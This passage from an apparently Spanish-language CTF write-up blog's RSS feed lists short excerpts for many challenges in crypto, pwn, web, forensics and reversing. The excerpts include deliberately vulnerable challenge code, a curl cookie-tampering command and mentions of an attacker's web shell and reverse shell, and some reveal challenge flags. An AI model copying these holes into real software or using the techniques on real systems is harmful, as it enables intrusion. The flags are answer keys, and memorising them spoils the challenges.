LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDZzN5RXgxckpaSTlaL1FYUDhkbFVDTnhwKwovSmtzYU5qY3dvbXcydmQwSFZBWEcyRmtPbm82V3VsaGZhRHNseVFYV2JjRjFQcmZoUGFPSlROMTBkQ3lSa0JrCnJ1TlA4NnRMYUFQVnYvWnJObVpxSzhxSGZBRThvaG9tbWFnRkQ2NDlpVG5lNUdyV211TWJ1N3NiYmNXcWl6RnkKVjZKOGRZRU9JQUpUTU9Ra3V3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Finalmente, tenemos un README.txt que dice:
The flag is located at /app/flag.txt Reconocimiento El servidor remoto está ejecutando probablemente una aplicación Flask (nótese que el mensaje de respuesta HTTP aparece en letras mayúsculas, y también la cabecera Server):</description></item><item><title>Character Encoding</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/character-encoding/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/character-encoding/</guid><description>Se nos proporcionan estos caracteres:
43 54 46 6C 65 61 72 6E 7B 34 35 43 31 31 5F 31 35 5F 55 35 33 46 55 4C 7D Como son todo números y letras entre A y F, parece que se trata de una codificación en ASCII hexadecimal.
Por ejemplo, 0x43 es el código de la C, 0x54 es el de la T y 0x46 el de la F.</description></item><item><title>Chase</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/chase/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/chase/</guid><description>Se nos proporciona un archivo PCAP con mensajes HTTP y segmentos TCP:
Tráfico HTTP Si filtramos por HTTP, veremos algunas peticiones y respuestas:
Podríamos pensar que el cibercriminal encontró una vulnerabilidad de subida de archivo y subió un cmd.aspx y luego nc64.exe para ejecutar comandos. De hecho, podemos ver que el cibercriminal consiguió una reverse shell en la máquina Windows:
Al final de la captura PCAP, vemos que el cibercriminal intenta acceder a un archivo llamado JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.</description></item><item><title>ChromeMiner</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/chromeminer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/chromeminer/</guid><description>Tenemos un sitio web fraudulento de Discord que se ve así:
Descompilación de C# .NET Si pinchamos en &amp;ldquo;Login&amp;rdquo;, descargaremos un ejecutable de Windows llamado DiscurdNitru.exe:
$ file DiscurdNitru.exe DiscurdNitru.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows Si analizamos las strings, veremos que el ejecutable está compilado desde C# .NET:
$ strings DiscurdNitru.exe | grep .NET .NETFramework,Version=v4.6 .NET Framework 4.6 Por lo tanto, podemos usar JetBrains dotPeek para descompilar el archivo:</description></item><item><title>Classic, yet complicated!</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/classic-yet-complicated/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/classic-yet-complicated/</guid><description>Se nos proporciona un texto cifrado:
alp gwcsepul gtavaf, nlv prgpbpsu mb h jcpbyvdlq, ipltga rv glniypfa we ekl 16xs nsjhlcb. px td o lccjdstslpahzn fptspf xstlxzi te iosj ezv sc xcns ttsoic lzlvrmhaw ez sjqijsa xsp rwhr. tq vxspf sciov, alp wsphvcv pr ess rwxpqlvp nwlvvc dyi dswbhvo ef htqtafvyw hqzfbpg, ezutewwm zcep xzmyr o scio ry tscoos rd woi pyqnmgelvr vpm . qbctnl xsp akbflowllmspwt nlwlpcg, lccjdstslpahzn fptspfo oip qvx dfgysgelipp ec bfvbxlrnj ojocjvpw, ld akfv ekhr zys hskehy my eva dclluxpih yoe mh yiacsoseehk fj l gebxwh sieesn we ekl iynfudktru.</description></item><item><title>Close Enough</title><link>https://7rocky.github.io/ctf/other/seetf/close-enough/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/seetf/close-enough/</guid><description>Se nos dice que una implementación de RSA utiliza un número primo y el siguiente número primo. Tenemos el texto cifrado:
4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017 Y también el código fuente:
from Crypto.Util.number import getPrime, bytes_to_long from Crypto.PublicKey import RSA from secret import flag, getNextPrime p = getPrime(1024) q = getNextPrime(p) n = p * q e = 65537 key = RSA.construct((n, e)).export_key().decode() with open("key", "w") as f: f.write(key) m = bytes_to_long(flag.encode()) c = pow(m, e, n) print(f"</description></item><item><title>clutter-overflow</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/clutter-overflow/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/clutter-overflow/</guid><description>Se nos proporciona un binario de 64 bits llamado chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Tenemos también el código fuente en C. Básicamente, lo que hace el programa es llamar a la función gets y después comparar una variable local (code) con el valor de una variable global (GOAL):
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #define SIZE 0x100 #define GOAL 0xdeadbeef const char* HEADER = "</description></item><item><title>Colliding Heritage</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/colliding-heritage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/colliding-heritage/</guid><description>Se nos proporciona el código fuente del servidor en Python:
#!/usr/bin/env python3 import signal from secrets import randbelow from hashlib import md5 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long FLAG = "HTB{???????????????????????????}" class MD5chnorr: def __init__(self): # while True: # self.q = getPrime(128) # self.p = 2*self.q + 1 # if isPrime(self.p): # break self.p = 0x16dd987483c08aefa88f28147702e51eb self.q = (self.p - 1) // 2 self.g = 3 self.x = randbelow(self.q) self.</description></item><item><title>Colliding Heritage</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/colliding-heritage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/colliding-heritage/</guid><description>Se nos proporciona el código fuente del servidor en Python:
#!/usr/bin/env python3 import signal from secrets import randbelow from hashlib import md5 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long FLAG = "HTB{???????????????????????????}" class MD5chnorr: def __init__(self): # while True: # self.q = getPrime(128) # self.p = 2*self.q + 1 # if isPrime(self.p): # break self.p = 0x16dd987483c08aefa88f28147702e51eb self.q = (self.p - 1) // 2 self.g = 3 self.x = randbelow(self.q) self.</description></item><item><title>Come on feel the nonce</title><link>https://7rocky.github.io/ctf/other/ctfzone/come-on-feel-the-nonce/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ctfzone/come-on-feel-the-nonce/</guid><description>Se nos proporciona el código fuente en Go:
package main import ( "crypto/elliptic" cryptorand "crypto/rand" "crypto/sha256" "encoding/base64" "fmt" "log" "math" "math/big" "math/rand" "os" ) func randInt64() int64 { n, err := cryptorand.Int(cryptorand.Reader, big.NewInt(math.MaxInt64)) if err != nil { panic(err) } return n.Int64() } func encrypt(data, priv []byte) string { res := make([]byte, 0) st := sha256.Sum256(priv) for i, b := range data { res = append(res, b^st[i]) } return base64.StdEncoding.EncodeToString(res) } func decrypt(enc string, priv []byte) string { res := make([]byte, 0) data, _ := base64.</description></item><item><title>Composition</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/composition/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/composition/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from Crypto.Util.number import isPrime, getPrime, GCD, long_to_bytes, bytes_to_long from Crypto.Cipher import AES from Crypto.Util.Padding import pad from secret import flag from ecc import EllipticCurve from hashlib import md5 import os import random print("Welcome to the ECRSA test center. Your encrypted data will be sent soon.") print("Please check the logs for the parameters.") legendre = lambda x,p: pow(x,(p-1)//2,p) def next_prime(num): if num % 2 == 0: num += 1 else: num += 2 while not isPrime(num): num += 2 return num def getrandpoint(ec,p,q): num = random.</description></item><item><title>Compressor</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/compressor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/compressor/</guid><description>Para este reto solamente tenemos una instancia remota a la que conectarnos:
$ nc 157.245.33.77 31001 [*] Directory to work in: 9wIylX4fBakMNG8u6YfY37k3k1geVXHv Component List: +===============+ | | | 1. Head 🤖 | | 2. Torso 🦴 | | 3. Hands 💪 | | 4. Legs 🦵 | | | +===============+ [*] Choose component: Podemos elegir el primero, por ejemplo:
[*] Choose component: 1 [*] Sub-directory to work in: 9wIylX4fBakMNG8u6YfY37k3k1geVXHv/Head Actions: 1.</description></item><item><title>Confidentiality</title><link>https://7rocky.github.io/ctf/htb-challenges/blockchain/confidentiality/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/blockchain/confidentiality/</guid><description>Se nos proporciona un archivo de Solidity llamado AccessToken.sol:
// SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.19; import {ERC721} from "./lib/ERC721.sol"; import {Owned} from "./lib/Owned.sol"; contract AccessToken is ERC721, Owned { uint256 public currentSupply; bytes[] public usedSignatures; bytes32 public constant approvalHash = 0x4ed1c9f7e3813196653ad7c62857a519087860f86aff4bc7766c8af8756a72ba; constructor(address _owner) Owned(_owner) ERC721("AccessToken", "ACT") {} function safeMint(address to) public onlyOwner returns (uint256) { return _safeMintInternal(to); } function safeMintWithSignature(bytes memory signature, address to) external returns (uint256) { require(_verifySignature(signature), "Not approved"</description></item><item><title>Control Room</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/control-room/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/control-room/</guid><description>Se nos proporciona un binario de 64 bits llamado control_room:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Configuración del entorno También se nos proporciona la librería remota Glibc:
$ ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>Control Room</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/control-room/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/control-room/</guid><description>Se nos proporciona un binario de 64 bits llamado control_room:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Configuración del entorno También se nos proporciona la librería remota Glibc:
$ ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>Converging Visions</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/converging-visions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/converging-visions/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from secret import FLAG, p, a, b from random import randint from utils import EllipticCurve class PRNG: def __init__(self, p, mul1, mul2): self.mod = p * 6089788258325039501929073418355467714844813056959443481824909430411674443639248386564763122373451773381582660411059922334086996696436657009055324008041039 self.exp = 2 self.mul1 = mul1 self.mul2 = mul2 self.inc = int.from_bytes(b'Coordinates lost in space', 'big') self.seed = randint(2, self.mod - 1) def rotate(self): self.seed = (self.mul1 * pow(self.seed, 3) + self.mul2 * self.</description></item><item><title>Converging Visions</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/converging-visions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/converging-visions/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from secret import FLAG, p, a, b from sage.all_cmdline import * class PRNG: def __init__(self, p, mul1, mul2): self.mod = p * 6089788258325039501929073418355467714844813056959443481824909430411674443639248386564763122373451773381582660411059922334086996696436657009055324008041039 self.exp = 2 self.mul1 = mul1 self.mul2 = mul2 self.inc = int.from_bytes(b'Coordinates lost in space', 'big') self.seed = randint(2, self.mod - 1) def rotate(self): self.seed = (self.mul1 * pow(self.seed, 3) + self.mul2 * self.seed + self.inc) % self.</description></item><item><title>Cookies</title><link>https://7rocky.github.io/ctf/picoctf/web-exploitation/cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/web-exploitation/cookies/</guid><description>Se nos proporciona una página web que pregunta por una cookie:
Mirando en las herramientas de desarrollador, vemos que tenemos una cookie name=-1. Si ponemos snickerdoodle como el campo de texto sugiere, la cookie cambiará a name=0:
Vamos a modificar el valor de la cookie usando curl y mostrar solo el mensaje:
$ curl mercury.picoctf.net:27177/check -sH 'Cookie: name=0' | grep -oE '&amp;lt;b&amp;gt;.*?&amp;lt;/b&amp;gt;' &amp;lt;b&amp;gt;I love snickerdoodle cookies!&amp;lt;/b&amp;gt; Ahora vamos a usar un bucle en Bash para ver si algo cambia al poner otro valor como cookie:</description></item><item><title>cos1</title><link>https://7rocky.github.io/ctf/imaginaryctf/cos1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/cos1/</guid><description>Se nos pide calcular el coseno de 42 radianes, redondeado a 6 decimales. Esto es simple:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; import math &amp;gt;&amp;gt;&amp;gt; math.cos(42) -0.39998531498835127 &amp;gt;&amp;gt;&amp;gt; round(math.cos(42), 6) -0.399985 &amp;gt;&amp;gt;&amp;gt; 'ictf{' + str(round(math.cos(42), 6)) + '}' 'ictf{-0.399985}'</description></item><item><title>cos2</title><link>https://7rocky.github.io/ctf/imaginaryctf/cos2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/cos2/</guid><description>Se nos pide calcular el coseno de 42 radianes, redondeado a 10 decimales. Para esto, podemos usar Wolfram Alpha:
Y la flag es:
ictf{-0.3999853149883512939547073371772020283804228791424190606167446601513424425835587794388549191368621883}</description></item><item><title>CRSid</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/crsid/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/crsid/</guid><description>Se nos proporciona un binario de 64 bits llamado crsid:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Si lo ejecutamos, tenemos que introducir un CRSid y luego tenemos este menú:
$ ./crsid ██████╗██████╗ ███████╗██╗██████╗ ██╔════╝██╔══██╗██╔════╝██║██╔══██╗ ██║ ██████╔╝███████╗██║██║ ██║ ██║ ██╔══██╗╚════██║██║██║ ██║ ╚██████╗██║ ██║███████║██║██████╔╝ ╚═════╝╚═╝ ╚═╝╚══════╝╚═╝╚═════╝ [i] Enter your CRSid: asdf ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#] Ingeniería inversa Se trata de un reto típico de explotación del heap.</description></item><item><title>CryptoConundrum</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/cryptoconundrum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/cryptoconundrum/</guid><description>Se nos proporciona el código fuente en Python para cifrar un mensaje:
from os import urandom from Crypto.Cipher import AES from secret import MESSAGE assert all([x.isupper() for x in MESSAGE]) assert MESSAGE.startswith('A') class Cipher: def __init__(self): self.salt = urandom(14) key = urandom(16) self.cipher = AES.new(key, AES.MODE_ECB) def encrypt(self, message): return [ self.cipher.encrypt(message[i:i + 2].encode() + self.salt) for i in range(len(message) - 1) ] def main(): cipher = Cipher() encrypted = cipher.</description></item><item><title>cryptoGRAPHy (1, 2, 3)</title><link>https://7rocky.github.io/ctf/other/sekai-ctf/cryptography-1-2-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/sekai-ctf/cryptography-1-2-3/</guid><description>Esta serie de retos está contextualizada en la teoría de grafos combinada con la criptografía. El autor implementó una librería de Python usando networkx para manejar grafos y funciones criptográficas como el cifrado AES, HMAC o el hash SHA256.
Estos retos fueron algo polémicos debido a que los jugadores necesitaban leer, analizar y comprender la librería implementada para el esquema de cifrado de grafos (Graph Encryption Scheme) y luego buscar una solución para el reto correspondiente.</description></item><item><title>Cult Meeting</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/cult-meeting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/cult-meeting/</guid><description>Se nos proporciona un archivo binario llamado meeting:
$ file meeting meeting: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=72d8b06e4ca750d5c24395d3349c3121b9b95283, for GNU/Linux 3.2.0, not stripped Ingeniería inversa Usando Ghidra, podemos leer el código descompilado en C. Esta es la función main:
int main() { int ret; char *pointer; char input_data[64]; setvbuf(stdout, NULL, 2, 0); puts("\x1b[3mYou knock on the door and a panel slides back\x1b[0m"); puts(&amp;amp;DAT_00102040); fwrite("</description></item><item><title>CurlAsAService</title><link>https://7rocky.github.io/ctf/htb-challenges/web/curlasaservice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/curlasaservice/</guid><description>Se nos proporciona esta página web, que nos permite ejecutar curl:
Análisis de código fuente También tenemos el código fuente en PHP. Esto es index.php:
&amp;lt;?php date_default_timezone_set('UTC'); spl_autoload_register(function ($name){ if (preg_match('/Controller$/', $name)) { $name = "controllers/${name}"; } else if (preg_match('/Model$/', $name)) { $name = "models/${name}"; } include_once "${name}.php"; }); $router = new Router(); $router-&amp;gt;new('GET', '/', 'CurlController@index'); $router-&amp;gt;new('POST', '/api/curl', 'CurlController@execute' ); $response = $router-&amp;gt;match(); die($response); Aquí solo vemos dos rutas. La que es más interesante se gestiona con CurlController.</description></item><item><title>Curse Breaker</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/curse-breaker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/curse-breaker/</guid><description>Se nos proporciona un binario llamado breaker:
$ file breaker breaker: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=203d702c3e6cc789e148886f986713f7cf21e2c2, for GNU/Linux 3.2.0, not stripped Ingeniería inversa Usando Ghidra, podemos leer el código fuente descompilado en C. Esta es la función main:
int main() { size_t newline_index; long i5; char magic_word[50]; uint i; magic_word._0_8_ = 0; magic_word._8_8_ = 0; magic_word._16_8_ = 0; magic_word._24_8_ = 0; magic_word.</description></item><item><title>Curse Breaker</title><link>https://7rocky.github.io/ctf/other/htb-unictf/curse-breaker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/curse-breaker/</guid><description>Se nos proporciona un binario llamado breaker:
$ file breaker breaker: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=276c71525dd765da538440a4615fa5b717e331ad, for GNU/Linux 3.2.0, not stripped Ingeniería inversa Usando Ghidra, podemos leer el código fuente descompilado en C. Esta es la función main:
int main() { size_t newline_index; long i5; char magic_word[50]; uint i; magic_word._0_8_ = 0; magic_word._8_8_ = 0; magic_word._16_8_ = 0; magic_word._24_8_ = 0; magic_word.</description></item><item><title>Cursed Secret Party</title><link>https://7rocky.github.io/ctf/htb-challenges/web/cursed-secret-party/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/cursed-secret-party/</guid><description>Se nos proporciona esta página web:
Análisis de código estático También tenemos el código fuente en JavaScript de la aplicación web, hecha en Node.js con Express JS. Este archivo es routes/index.js:
const express = require('express'); const router = express.Router({ caseSensitive: true }); const AuthMiddleware = require('../middleware/AuthMiddleware'); const bot = require('../bot'); let db; const response = data =&amp;gt; ({ message: data }); router.get('/', (req, res) =&amp;gt; { return res.render('index.html'); }); router.post('/api/submit', (req, res) =&amp;gt; { const { halloween_name, email, costume_type, trick_or_treat } = req.</description></item><item><title>Cursed Secret Party</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/cursed-secret-party/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/cursed-secret-party/</guid><description>Se nos proporciona esta página web:
Análisis de código estático También tenemos el código fuente en JavaScript de la aplicación web, hecha en Node.js con Express JS. Este archivo es routes/index.js:
const express = require('express'); const router = express.Router({ caseSensitive: true }); const AuthMiddleware = require('../middleware/AuthMiddleware'); const bot = require('../bot'); let db; const response = data =&amp;gt; ({ message: data }); router.get('/', (req, res) =&amp;gt; { return res.render('index.html'); }); router.post('/api/submit', (req, res) =&amp;gt; { const { halloween_name, email, costume_type, trick_or_treat } = req.</description></item><item><title>CVE-XXXX-XXXX</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/cve-xxxx-xxxx/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/cve-xxxx-xxxx/</guid><description>Tenemos el siguiente enunciado:
The CVE we&amp;rsquo;re looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.
Se nos pide buscar el identificador de CVE de la primera vulnerabilidad de RCE en Windows Print Spooler Service de 2021. Esta vulnerabilidad se conoce como PrintNightmare, y contiene varios CVE.</description></item><item><title>Da Vinci</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/da-vinci/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/da-vinci/</guid><description>Se nos proporcionan tres imágenes JPEG:
monalisa.jpg: Plans.jpg: Thepassword_is_the_small_name_of_the_actor_named_Hanks.jpg: $ file monalisa.jpg monalisa.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 92", comment: "Optimized by JPEGmini 3.9.20.0L Internal 0x8c97c7da", baseline, precision 8, 1280x1936, components 3 $ file Plans.jpg Plans.jpg: JPEG image data, JFIF standard 1.02, aspect ratio, density 100x100, segment length 16, baseline, precision 8, 800x600, components 3 $ file Thepassword_is_the_small_name_of_the_actor_named_Hanks.</description></item><item><title>Deadly Arthropod</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/deadly-arthropod/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/deadly-arthropod/</guid><description>Se nos proporciona un archivo PCAP llamado deadly_arthropod.pcap con algunos eventos USB:
Identificando el dispositivo Hay un evento que muestra que el dispositivo USB es un teclado (concretamente, Razer BlackWidow Ultimate 2013):
Por lo tanto, necesitaremos analizar las pulsaciones de teclas, como en Logger. Los dispositivos de hardware utilizan un protocolo conocido como Human Interface Device (HID). Se puede encontrar más información en Wikipedia. De hecho, hay un manual de documentación adjunto: ww.</description></item><item><title>DHCPPP</title><link>https://7rocky.github.io/ctf/other/plaid-ctf/dhcppp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/plaid-ctf/dhcppp/</guid><description>Se nos proporciona el código fuente en Python del servidor que tiene la flag:
import time, zlib import secrets import hashlib import requests from Crypto.Cipher import ChaCha20_Poly1305 import dns.resolver CHACHA_KEY = secrets.token_bytes(32) TIMEOUT = 1e-1 def encrypt_msg(msg, nonce): # In case our RNG nonce is repeated, we also hash # the message in. This means the worst-case scenario # is that our nonce reflects a hash of the message # but saves the chance of a nonce being reused across # different messages nonce = sha256(msg[:32] + nonce[:32])[:12] cipher = ChaCha20_Poly1305.</description></item><item><title>Didactic Octo Paddles</title><link>https://7rocky.github.io/ctf/htb-challenges/web/didactic-octo-paddles/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/didactic-octo-paddles/</guid><description>Se nos proporciona un sitio web como este:
También tenemos el código fuente en Node.js.
Análisis del código fuente La aplicación web está construida con Express JS. Después de leer algunos archivos, uno que destaca es middlewares/AdminMiddleware.js:
const jwt = require("jsonwebtoken"); const { tokenKey } = require("../utils/authorization"); const db = require("../utils/database"); const AdminMiddleware = async (req, res, next) =&amp;gt; { try { const sessionCookie = req.cookies.session; if (!sessionCookie) { return res.</description></item><item><title>Didactic Octo Paddles</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/didactic-octo-paddles/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/didactic-octo-paddles/</guid><description>Se nos proporciona un sitio web como este:
También tenemos el código fuente en Node.js.
Análisis del código fuente La aplicación web está construida con Express JS. Después de leer algunos archivos, uno que destaca es middlewares/AdminMiddleware.js:
const jwt = require("jsonwebtoken"); const { tokenKey } = require("../utils/authorization"); const db = require("../utils/database"); const AdminMiddleware = async (req, res, next) =&amp;gt; { try { const sessionCookie = req.cookies.session; if (!sessionCookie) { return res.</description></item><item><title>Don't Bump Your Head(er)</title><link>https://7rocky.github.io/ctf/ctflearn/web/dont-bump-your-header/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/web/dont-bump-your-header/</guid><description>Se nos proporciona una URL para interactuar con ella. Vamos a usar curl para ello:
$ curl 165.227.106.113/header.php Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: curl/7.81.0 &amp;lt;!-- Sup3rS3cr3tAg3nt --&amp;gt; Parece que tenemos que utilizar un agente de usuario concreto (a lo mejor funciona con Sup3rS3cr3tAg3nt):
$ curl 165.227.106.113/header.php -H 'User-Agent: Sup3rS3cr3tAg3nt' Sorry, it seems as if you did not just come from the site, "</description></item><item><title>Don't Overreact</title><link>https://7rocky.github.io/ctf/htb-challenges/mobile/dont-overreact/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/mobile/dont-overreact/</guid><description>Se nos proporciona un archivo APK (app-release.apk).
Extracción de APK Del nombre del reto, podemos pensar en React Native para desarrollo de aplicaciones móviles. De momento, vamos a extraer el contenido del archivo APK con apktool:
$ apktool d app-release.apk I: Using Apktool 2.6.1 on app-release.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: ~/.local/share/apktool/framework/1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs.</description></item><item><title>Down the Rabinhole</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/down-the-rabinhole/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/down-the-rabinhole/</guid><description>Se nos proporciona un código en Python para cifrar la flag, y el correspondiente archivo out.txt:
